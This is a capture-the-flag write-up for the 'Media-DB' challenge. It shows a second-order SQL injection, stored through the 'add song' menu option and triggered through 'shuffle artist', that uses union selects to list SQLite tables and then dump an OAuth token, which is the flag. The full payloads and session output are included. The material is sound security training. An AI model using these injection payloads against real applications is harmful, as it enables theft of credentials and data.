### Media-DB / MISC / WebPluxMediaPC

Flag: `CTF{fridge_cast_oauth_token_cahn4Quo}`

> The gatekeeper software gave you access to a custom database to organize a music playlist. It looks like it might also be connected to the smart fridge to play custom door alarms. Maybe we can grab an oauth token that gets us closer to cake.

`$ nc media-db.ctfcompetition.com 1337`

`attachment`

In the attachment we find `media-db.py`. Its the sourcecode for an interactive menu:

```
=== Media DB ===
1) add song
2) play artist
3) play song
4) shuffle artist
5) exit
>
```

The sourcecode contains SQL so my first guess is this application has a SQL injection vulnerability. So I start looking at how input parameters are used. There seems to be some protection:

```
  if choice == '1':
    my_print("artist name?")
    artist = raw_input().replace('"', "")
    my_print("song name?")
    song = raw_input().replace('"', "")
    c.execute("""INSERT INTO media VALUES ("{}", "{}")""".format(artist, song))
```

Above code strips `"` characters, so we can not use this when adding a new song.

```    
  elif choice == '2':
    my_print("artist name?")
    artist = raw_input().replace("'", "")
    print_playlist("SELECT artist, song FROM media WHERE artist = '{}'".format(artist))
```

And here `'` characters are stripped. Curious to see different stripping in these code blocks (double vs single quotes).

Looking further, option 4 looks like a winner:

```
  elif choice == '4':
    artist = random.choice(list(c.execute("SELECT DISTINCT artist FROM media")))[0]
    my_print("choosing songs from random artist: {}".format(artist))
    print_playlist("SELECT artist, song FROM media WHERE artist = '{}'".format(artist))
```

Here the artist value is used a select statement without sanitizing any quotes.

Time to draw up a plan. Let's add an artist with `'` characters, which are allowed. Then use option 4 to query that artist and use the value in the 2nd statement.

Let's try to discover the available tables:

```
nc media-db.ctfcompetition.com 1337
=== Media DB ===
1) add song
2) play artist
3) play song
4) shuffle artist
5) exit
> 1
artist name?
' union select tbl_name, 2 FROM sqlite_master --
song name?
foo

1) add song
2) play artist
3) play song
4) shuffle artist
5) exit
> 4
choosing songs from random artist: ' union select tbl_name, 2 FROM sqlite_master --

== new playlist ==
1: "2" by "media"
2: "2" by "oauth_tokens"
```

OK. We knew about the `media` table, but that `oauth_tokens` looks interesting!

Reconnect and add a song for querying all SQL so we discover the columns:

```
1) add song
2) play artist
3) play song
4) shuffle artist
5) exit
> 1
artist name?
' union select sql, 2 FROM sqlite_master --
song name?
foo

1) add song
2) play artist
3) play song
4) shuffle artist
5) exit
> 4
choosing songs from random artist: ' union select sql, 2 FROM sqlite_master --

== new playlist ==
1: "2" by "CREATE TABLE media (artist text, song text)"
2: "2" by "CREATE TABLE oauth_tokens (oauth_token text)"
```

OK. So the `oauth_tokens` table has only one column named `oauth_token`. Let's query this table:

```
> 1
artist name?
' union select oauth_token, 2 FROM oauth_tokens --
song name?
foo
1) add song
2) play artist
3) play song
4) shuffle artist
5) exit
> 4
choosing songs from random artist: ' union select oauth_token, 2 FROM oauth_tokens --

== new playlist ==
1: "2" by "CTF{fridge_cast_oauth_token_cahn4Quo}
"
```

And we're done!

